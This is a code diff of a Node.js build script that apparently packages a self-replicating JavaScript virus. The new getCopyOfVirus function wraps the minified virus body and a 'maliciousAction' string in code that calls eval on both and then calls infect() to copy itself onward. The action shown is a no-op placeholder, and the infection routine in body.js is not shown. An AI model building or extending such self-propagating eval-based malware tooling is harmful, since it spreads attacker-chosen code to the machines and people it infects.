@@ -1,15 +1,24 @@
 const fs   = require( "fs-extra" );
 const exec = require( "child-process-promise" ).exec;
 
-function escape(str) {
-    return str.replace(/[\\"]/g, "\\$&");
+const maliciousAction = "(() => null)();";
+
+function getCopyOfVirus( virusSrc, action ) {
+    const esc = str => str.replace(/[\\"]/g, "\\$&");
+    return `
+(function() {
+    var virusSrc = "${ esc( virusSrc ) }";
+    var action   = "${ esc( action ) }";
+    eval( action + virusSrc + "infect(virusSrc, action);" ); 
+})();`;
 }
+
 
 async function build() {
 
-    var src = "payload.js";
-    var compiled = ".build/payload.compiled.js";
-    var minified = ".build/payload.min.js";
+    var src = "body.js";
+    var compiled = ".build/body.compiled.js";
+    var minified = ".build/body.min.js";
         
     var tgt = "payload.built.js";
 
@@ -18,12 +27,7 @@ async function build() {
     await exec( `./node_modules/.bin/uglifyjs --mangle --compress -o ${minified} ${compiled}` );
 
     var raw = await fs.readFile( minified, "utf-8" );
-    await fs.writeFile( tgt, `(function() {
-        var payload = "${ escape( raw ) }";
-        var decoded = decodeURI(payload);
-        eval(decoded);
-        global.infect(payload);
-    })();` );
+    await fs.writeFile( tgt, getCopyOfVirus( raw, maliciousAction ) );
 }
 
 build();
